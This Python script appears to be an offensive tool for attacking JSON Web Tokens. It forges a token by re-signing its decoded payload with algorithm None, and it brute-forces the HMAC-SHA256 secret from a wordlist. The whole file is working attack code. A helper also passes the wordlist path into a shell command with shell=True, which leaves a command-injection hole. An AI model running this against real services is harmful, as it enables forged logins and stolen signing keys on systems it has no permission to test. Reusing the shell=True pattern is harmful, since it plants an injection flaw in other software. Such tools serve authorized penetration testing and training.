#!/usr/bin/env python3

import subprocess
from termcolor import colored
import os
import threading
import time
import argparse
import shutil,time,math
import jwt
import hmac
import hashlib
import base64

def banner():
        x="""
                _  _ _ _    _    ____ ____   ____ ____ ___ 
                |_/  | |    |    |___ |__/   |  | |  |   /
                | \\_ | |___ |___ |___ |  \\   |__| |__|  /  
      """
 
        y = "           +-----------------------------------------+"     
        z = "                                                   ~~Twitter: Killeroo7p\n\n"

        print(colored(x,'blue'),colored(y,'red'),colored(z,'green'))
        print()

    
def num_of_lines(wordlist):
        cmd = f"wc -l {wordlist}|cut -d' ' -f1"                #Bash Coz it gives 5 times faster result
        lines= subprocess.check_output(cmd,shell=True).decode()
        return lines

def get_args():
        parser = argparse.ArgumentParser()

        #CHANGE SIGNATURE TO NONE
        parser.add_argument('-t','--token',dest='token',help="JWT token")
        parser.add_argument('-cs','--change-sign',dest='change_sign',help="Change Signature To None",action="store_true")

        #BRUTEFORCE SECRET KEY
        parser.add_argument('-bs','--brute-secret',dest='brute_secret',help="Bruteforce Secret Key",action="store_true")
        parser.add_argument('-w','--wordlist',dest='wordlist',help="Wordlist to bruteforce")

        args = parser.parse_args()
        return args

def change_sig_to_none(token):
	jwtToken = token
	decodedToken = jwt.decode(jwtToken, verify=False)
	noneEncoded = jwt.encode(decodedToken, key='', algorithm=None)

	print(colored("JWT Token with None Signature:","blue"),colored({noneEncoded.decode()},"yellow"))


def bruteforce_sign(token,wordlist):

	jwtToken = token
	header,payload,sign = jwtToken.split(".") #Header,Payload,Signature
	
	file  =  open(wordlist,'r')
	lines = file.readlines()

	for line in lines:
		key = line.strip()
		print(colored(f"Trying: {key}","blue"))
		if sign_calculator(header+"."+payload, key) == sign:		#Calculate Signature with our key
			print(key)


def sign_calculator(str,key):	#Calculate Signature
	return base64.urlsafe_b64encode(hmac.new(key.encode(), str.encode(),hashlib.sha256).digest()).decode('utf8').rstrip("=")

#	return base64.urlsafe_b64encode(hmac.new(key, str,hashlib.sha256).digest()).decode('utf8').rstrip("=")

def main():
	#Test_Token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ"
	banner()
	args = get_args()

	token = args.token
	if not token:
		token = input(colored("Enter the JWT token: ","green"))

	if args.change_sign:
		change_sig_to_none(token)

	if args.brute_secret:
		if not args.wordlist:
			print("Please Specify the Wordlist To Bruteforce(ADD a DEFAULT WORDLIST FILE and REMOVE THIS)")
			exit()

		bruteforce_sign(token,args.wordlist)

		
main()